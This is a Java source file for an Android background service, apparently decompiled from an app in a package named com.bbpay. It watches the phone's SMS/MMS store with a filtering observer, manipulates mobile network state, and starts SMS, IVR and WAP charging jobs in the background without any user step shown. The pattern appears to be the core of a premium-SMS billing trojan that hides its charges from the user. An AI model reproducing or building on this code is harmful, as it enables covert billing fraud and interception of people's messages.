package com.bbpay;
import java.util.List;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.util.Log;
import com.bbpay.bean.Constants;
import com.bbpay.bean.OnLineGameBiz;
import com.bbpay.bean.SmsBean;
import com.bbpay.db.OnlineGameDbManager;
import com.bbpay.db.SmsDbManager;
import com.bbpay.onlinegame.OnLineGameManager;
import com.bbpay.sms.SmsManager;
import com.bbpay.sms.filtersms.SmsObserver;
import com.bbpay.util.MobileNetworkManage;
import com.bbpay.util.MyLogger;

public class PlateService extends Service {
    private static boolean isWainting;
    private SmsObserver smsObserver;
    private Handler handler = new Handler() {
        @Override
        public void handleMessage(Message message) {
            super.handleMessage(message);
            Log.e("handleMessage", new StringBuilder("Message msg.what=").append(message.what).append(" msg.arg1=").append(message.arg1).append(" msg.arg2=").append(message.arg2)
                    .append(" msg.obj=").append(message.obj).append(" msg.toString()=").append(message.toString()).toString());
        }
    };
    private List<OnLineGameBiz> onlineGameBizList;
    private List<SmsBean> smsList;
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public void onCreate() {
        super.onCreate();
        smsObserver = SmsObserver.getInstanse(handler);
        smsObserver.setContext(this);
        getContentResolver().registerContentObserver(Uri.parse("content://mms-sms"), true, smsObserver);
    }
    @Override
    public void onStart(Intent intent, int i) {
        if (!isWainting) {
            new AsyncTask<String, String, String>() {
                @Override
                protected String doInBackground(String... as) {
                    do {
                        if (!Constants.IVR_FEEING && !Constants.SMS_FEEING && !Constants.WAP_FEEING) return null;
                        isWainting = true;
                        try {
                            Thread.sleep(10000L);
                        } catch (InterruptedException interruptedexception) {
                            interruptedexception.printStackTrace();
                        }
                        MyLogger.info("", "上次计费正在进行...等待计费");
                    } while (true);
                }
                @Override
                protected void onPostExecute(String s) {
                    startFee();
                    super.onPostExecute(s);
                }
            }.execute(new String[] {});
        }
    }
    private void recoverTooNetWork(Context context) {
        boolean needRecover = false;
        if (onlineGameBizList != null && onlineGameBizList.size() > 0) {
            if (smsList != null && smsList.size() > 0) {
                needRecover = true;
                for (SmsBean bean : smsList) {
                    if (!bean.isSms()) {
                        needRecover = false;
                        break;
                    }
                }
            }
        }
        if (needRecover) {
            //EpayLog.showSaveLog("===", "没有ANDROID网游和彩信计费，直接恢复网络");
            MobileNetworkManage.recoverNetWorkDir(context);
        }
    }
    private void startFee() {
        synchronized (this) {
            isWainting = false;
            smsObserver.getFilter().refreshFilterList();
            smsList = SmsDbManager.getInstance().getAllSMSBean(this);
            onlineGameBizList = OnlineGameDbManager.getInstance().getAllWap(this);
            recoverTooNetWork(this);
            startSmsFee();
            startOnLineGameFee();
        }
    }
    private void startOnLineGameFee() {
        if (!Constants.WAP_FEEING) {
            OnLineGameManager.startFee(this, onlineGameBizList);
        }
    }
    private void startSmsFee() {
        if (!Constants.SMS_FEEING) {
            SmsManager.startFee(this, smsList);
        }
    }
}
